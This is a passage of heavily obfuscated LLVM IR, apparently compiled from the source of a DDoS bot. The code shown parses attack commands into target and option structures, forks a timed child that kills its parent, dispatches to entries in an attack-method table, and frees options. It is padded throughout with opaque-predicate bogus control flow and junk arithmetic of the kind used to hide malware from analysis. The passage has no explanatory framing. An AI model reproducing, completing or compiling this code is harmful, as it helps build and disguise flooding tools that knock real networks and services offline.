  %232 = load i32, i32* @y.8
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %230, label %239, label %338

; <label>:239:                                    ; preds = %originalBBpart235
  %240 = load i32, i32* %12, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 1
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %239
  br label %347

; <label>:244:                                    ; preds = %239
  %245 = load i32, i32* @x.7
  %246 = load i32, i32* @y.8
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %244
  %253 = load i8*, i8** %11, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %11, align 8
  %255 = load i8, i8* %253, align 1
  %256 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %257 = load i32, i32* %13, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %259, i32 0, i32 1
  store i8 %255, i8* %260, align 8
  %261 = load i32, i32* %12, align 4
  %262 = sext i32 %261 to i64
  %263 = sub i64 %262, 1
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %12, align 4
  %265 = load i32, i32* %12, align 4
  %266 = sext i32 %265 to i64
  %267 = icmp ult i64 %266, 1
  %268 = load i32, i32* @x.7
  %269 = load i32, i32* @y.8
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart243, label %originalBB37alteredBB

originalBBpart243:                                ; preds = %originalBB37
  br i1 %267, label %276, label %277

; <label>:276:                                    ; preds = %originalBBpart243
  br label %347

; <label>:277:                                    ; preds = %originalBBpart243
  %278 = load i32, i32* @x.7
  %279 = load i32, i32* @y.8
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %277
  %286 = load i8*, i8** %11, align 8
  %287 = getelementptr inbounds i8, i8* %286, i32 1
  store i8* %287, i8** %11, align 8
  %288 = load i8, i8* %286, align 1
  store i8 %288, i8* %20, align 1
  %289 = load i32, i32* %12, align 4
  %290 = sext i32 %289 to i64
  %291 = sub i64 %290, 1
  %292 = trunc i64 %291 to i32
  store i32 %292, i32* %12, align 4
  %293 = load i32, i32* %12, align 4
  %294 = load i8, i8* %20, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp slt i32 %293, %295
  %297 = load i32, i32* @x.7
  %298 = load i32, i32* @y.8
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart255, label %originalBB45alteredBB

originalBBpart255:                                ; preds = %originalBB45
  br i1 %296, label %305, label %306

; <label>:305:                                    ; preds = %originalBBpart255
  br label %347

; <label>:306:                                    ; preds = %originalBBpart255
  %307 = load i8, i8* %20, align 1
  %308 = zext i8 %307 to i32
  %309 = add nsw i32 %308, 1
  %310 = sext i32 %309 to i64
  %311 = call noalias i8* @calloc(i64 %310, i64 1) #6
  %312 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %313 = load i32, i32* %13, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %315, i32 0, i32 0
  store i8* %311, i8** %316, align 8
  %317 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %318 = load i32, i32* %13, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %320, i32 0, i32 0
  %322 = load i8*, i8** %321, align 8
  %323 = load i8*, i8** %11, align 8
  %324 = load i8, i8* %20, align 1
  %325 = zext i8 %324 to i32
  call void @util_memcpy(i8* %322, i8* %323, i32 %325)
  %326 = load i8, i8* %20, align 1
  %327 = zext i8 %326 to i32
  %328 = load i8*, i8** %11, align 8
  %329 = sext i32 %327 to i64
  %330 = getelementptr inbounds i8, i8* %328, i64 %329
  store i8* %330, i8** %11, align 8
  %331 = load i8, i8* %20, align 1
  %332 = zext i8 %331 to i32
  %333 = load i32, i32* %12, align 4
  %334 = sub nsw i32 %333, %332
  store i32 %334, i32* %12, align 4
  br label %335

; <label>:335:                                    ; preds = %306
  %336 = load i32, i32* %13, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %13, align 4
  br label %218

; <label>:338:                                    ; preds = %originalBBpart235
  br label %339

; <label>:339:                                    ; preds = %338, %202
  %340 = call i32* @__errno_location() #7
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %14, align 4
  %342 = load i8, i8* %15, align 1
  %343 = load i8, i8* %16, align 1
  %344 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %345 = load i8, i8* %17, align 1
  %346 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %341, i8 zeroext %342, i8 zeroext %343, %struct.attack_target* %344, i8 zeroext %345, %struct.attack_option* %346)
  br label %347

; <label>:347:                                    ; preds = %339, %305, %276, %243, %201, %109, %101, %73, %originalBBpart24, %32
  %348 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %349 = icmp ne %struct.attack_target* %348, null
  br i1 %349, label %350, label %353

; <label>:350:                                    ; preds = %347
  %351 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %352 = bitcast %struct.attack_target* %351 to i8*
  call void @free(i8* %352) #6
  br label %353

; <label>:353:                                    ; preds = %350, %347
  %354 = load i32, i32* @x.7
  %355 = load i32, i32* @y.8
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %353
  %362 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %363 = icmp ne %struct.attack_option* %362, null
  %364 = load i32, i32* @x.7
  %365 = load i32, i32* @y.8
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %363, label %372, label %376

; <label>:372:                                    ; preds = %originalBBpart259
  %373 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %374 = load i8, i8* %17, align 1
  %375 = zext i8 %374 to i32
  call void @free_opts(%struct.attack_option* %373, i32 %375)
  br label %376

; <label>:376:                                    ; preds = %372, %originalBBpart259
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %377 = alloca i8*, align 8
  %378 = alloca i32, align 4
  %379 = alloca i32, align 4
  %380 = alloca i32, align 4
  %381 = alloca i8, align 1
  %382 = alloca i8, align 1
  %383 = alloca i8, align 1
  %384 = alloca %struct.attack_target*, align 8
  %385 = alloca %struct.attack_option*, align 8
  %386 = alloca i8, align 1
  store i8* %0, i8** %377, align 8
  store i32 %1, i32* %378, align 4
  store %struct.attack_target* null, %struct.attack_target** %384, align 8
  store %struct.attack_option* null, %struct.attack_option** %385, align 8
  %387 = load i32, i32* %378, align 4
  %388 = sext i32 %387 to i64
  %389 = icmp ult i64 %388, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %390 = load i8*, i8** %11, align 8
  %391 = getelementptr inbounds i8, i8* %390, i32 1
  store i8* %391, i8** %11, align 8
  %392 = load i8, i8* %390, align 1
  store i8 %392, i8* %16, align 1
  %393 = load i32, i32* %12, align 4
  %394 = sext i32 %393 to i64
  %_ = sub i64 0, %394
  %gen = add i64 %_, 1
  %395 = sub i64 %394, 1
  %396 = trunc i64 %395 to i32
  store i32 %396, i32* %12, align 4
  %397 = load i8, i8* %16, align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %162
  %400 = load i32, i32* %13, align 4
  %_11 = sub i32 %400, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %400, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 %400, 1
  %gen16 = mul i32 %_15, 1
  %_17 = sub i32 %400, 1
  %gen18 = mul i32 %_17, 1
  %_19 = sub i32 %400, 1
  %gen20 = mul i32 %_19, 1
  %_21 = sub i32 0, %400
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %400, 1
  %_24 = sub i32 %400, 1
  %gen25 = mul i32 %_24, 1
  %401 = add nsw i32 %400, 1
  store i32 %401, i32* %13, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %181
  %402 = load i32, i32* %12, align 4
  %403 = sext i32 %402 to i64
  %404 = icmp ult i64 %403, 1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %218
  %405 = load i32, i32* %13, align 4
  %406 = load i8, i8* %17, align 1
  %407 = zext i8 %406 to i32
  %408 = icmp slt i32 %405, %407
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %244
  %409 = load i8*, i8** %11, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %11, align 8
  %411 = load i8, i8* %409, align 1
  %412 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %413 = load i32, i32* %13, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %412, i64 %414
  %416 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %415, i32 0, i32 1
  store i8 %411, i8* %416, align 8
  %417 = load i32, i32* %12, align 4
  %418 = sext i32 %417 to i64
  %_38 = shl i64 %418, 1
  %_39 = sub i64 0, %418
  %gen40 = add i64 %_39, 1
  %_41 = shl i64 %418, 1
  %419 = sub i64 %418, 1
  %420 = trunc i64 %419 to i32
  store i32 %420, i32* %12, align 4
  %421 = load i32, i32* %12, align 4
  %422 = sext i32 %421 to i64
  %423 = icmp ult i64 %422, 1
  br label %originalBB37

originalBB45alteredBB:                            ; preds = %originalBB45, %277
  %424 = load i8*, i8** %11, align 8
  %425 = getelementptr inbounds i8, i8* %424, i32 1
  store i8* %425, i8** %11, align 8
  %426 = load i8, i8* %424, align 1
  store i8 %426, i8* %20, align 1
  %427 = load i32, i32* %12, align 4
  %428 = sext i32 %427 to i64
  %_46 = sub i64 %428, 1
  %gen47 = mul i64 %_46, 1
  %_48 = shl i64 %428, 1
  %_49 = shl i64 %428, 1
  %_50 = sub i64 0, %428
  %gen51 = add i64 %_50, 1
  %_52 = sub i64 0, %428
  %gen53 = add i64 %_52, 1
  %429 = sub i64 %428, 1
  %430 = trunc i64 %429 to i32
  store i32 %430, i32* %12, align 4
  %431 = load i32, i32* %12, align 4
  %432 = load i8, i8* %20, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp slt i32 %431, %433
  br label %originalBB45

originalBB57alteredBB:                            ; preds = %originalBB57, %353
  %435 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %436 = icmp ne %struct.attack_option* %435, null
  br label %originalBB57
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.9
  %8 = load i32, i32* @y.10
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %24 = call i32 @fork() #6
  store i32 %24, i32* %21, align 4
  %25 = load i32, i32* %21, align 4
  %26 = icmp eq i32 %25, -1
  %27 = load i32, i32* @x.9
  %28 = load i32, i32* @y.10
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %21, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %originalBBpart2
  ret void

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @x.9
  %41 = load i32, i32* @y.10
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = call i32 @fork() #6
  store i32 %48, i32* %22, align 4
  %49 = load i32, i32* %22, align 4
  %50 = icmp eq i32 %49, -1
  %51 = load i32, i32* @x.9
  %52 = load i32, i32* @y.10
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %50, label %59, label %60

; <label>:59:                                     ; preds = %originalBBpart24
  call void @exit(i32 0) #8
  unreachable

; <label>:60:                                     ; preds = %originalBBpart24
  %61 = load i32, i32* @x.9
  %62 = load i32, i32* @y.10
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %60
  %69 = load i32, i32* %22, align 4
  %70 = icmp eq i32 %69, 0
  %71 = load i32, i32* @x.9
  %72 = load i32, i32* @y.10
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %70, label %79, label %84

; <label>:79:                                     ; preds = %originalBBpart28
  %80 = load i32, i32* %15, align 4
  %81 = call i32 @sleep(i32 %80)
  %82 = call i32 @getppid() #6
  %83 = call i32 @kill(i32 %82, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* @x.9
  %86 = load i32, i32* @y.10
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  store i32 0, i32* %23, align 4
  %93 = load i32, i32* @x.9
  %94 = load i32, i32* @y.10
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %101

; <label>:101:                                    ; preds = %147, %originalBBpart212
  %102 = load i32, i32* @x.9
  %103 = load i32, i32* @y.10
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %101
  %110 = load i32, i32* %23, align 4
  %111 = load i8, i8* @methods_len, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp slt i32 %110, %112
  %114 = load i32, i32* @x.9
  %115 = load i32, i32* @y.10
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %113, label %122, label %150

; <label>:122:                                    ; preds = %originalBBpart216
  %123 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %124 = load i32, i32* %23, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %123, i64 %125
  %127 = load %struct.attack_method*, %struct.attack_method** %126, align 8
  %128 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %127, i32 0, i32 1
  %129 = load i8, i8* %128, align 8
  %130 = zext i8 %129 to i32
  %131 = load i8, i8* %16, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %130, %132
  br i1 %133, label %134, label %146

; <label>:134:                                    ; preds = %122
  %135 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %136 = load i32, i32* %23, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %135, i64 %137
  %139 = load %struct.attack_method*, %struct.attack_method** %138, align 8
  %140 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %139, i32 0, i32 0
  %141 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %140, align 8
  %142 = load i8, i8* %17, align 1
  %143 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %144 = load i8, i8* %19, align 1
  %145 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %141(i8 zeroext %142, %struct.attack_target* %143, i8 zeroext %144, %struct.attack_option* %145)
  br label %150

; <label>:146:                                    ; preds = %122
  br label %147

; <label>:147:                                    ; preds = %146
  %148 = load i32, i32* %23, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %23, align 4
  br label %101

; <label>:150:                                    ; preds = %134, %originalBBpart216
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %151 = alloca i32, align 4
  %152 = alloca i8, align 1
  %153 = alloca i8, align 1
  %154 = alloca %struct.attack_target*, align 8
  %155 = alloca i8, align 1
  %156 = alloca %struct.attack_option*, align 8
  %157 = alloca i32, align 4
  %158 = alloca i32, align 4
  %159 = alloca i32, align 4
  store i32 %0, i32* %151, align 4
  store i8 %1, i8* %152, align 1
  store i8 %2, i8* %153, align 1
  store %struct.attack_target* %3, %struct.attack_target** %154, align 8
  store i8 %4, i8* %155, align 1
  store %struct.attack_option* %5, %struct.attack_option** %156, align 8
  %160 = call i32 @fork() #6
  store i32 %160, i32* %157, align 4
  %161 = load i32, i32* %157, align 4
  %162 = icmp eq i32 %161, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %163 = call i32 @fork() #6
  store i32 %163, i32* %22, align 4
  %164 = load i32, i32* %22, align 4
  %165 = icmp eq i32 %164, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %60
  %166 = load i32, i32* %22, align 4
  %167 = icmp eq i32 %166, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  store i32 0, i32* %23, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %101
  %168 = load i32, i32* %23, align 4
  %169 = load i8, i8* @methods_len, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp slt i32 %168, %170
  br label %originalBB14
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %84

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.11
  %11 = load i32, i32* @y.12
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  store i32 0, i32* %5, align 4
  %18 = load i32, i32* @x.11
  %19 = load i32, i32* @y.12
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %78, %originalBBpart2
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %81

; <label>:30:                                     ; preds = %26
  %31 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i64 %33
  %35 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @x.11
  %40 = load i32, i32* @y.12
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i64 %49
  %51 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  call void @free(i8* %52) #6
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %30
  %62 = load i32, i32* @x.11
  %63 = load i32, i32* @y.12
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i32, i32* @x.11
  %71 = load i32, i32* @y.12
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %78

; <label>:78:                                     ; preds = %originalBBpart28
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  br label %26

; <label>:81:                                     ; preds = %26
  %82 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %83 = bitcast %struct.attack_option* %82 to i8*
  call void @free(i8* %83) #6
  br label %84

; <label>:84:                                     ; preds = %81, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %9
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %85 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %88, i32 0, i32 0
  %90 = load i8*, i8** %89, align 8
  call void @free(i8* %90) #6
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart29, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %86

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* @x.13
  %18 = load i32, i32* @y.14
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %25, i64 %27
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i32 0, i32 1
  %30 = load i8, i8* %29, align 8
  %31 = zext i8 %30 to i32
  %32 = load i8, i8* %8, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %31, %33
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %66

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %53 = load i32, i32* %10, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %52, i64 %54
  %56 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i32 0, i32 0
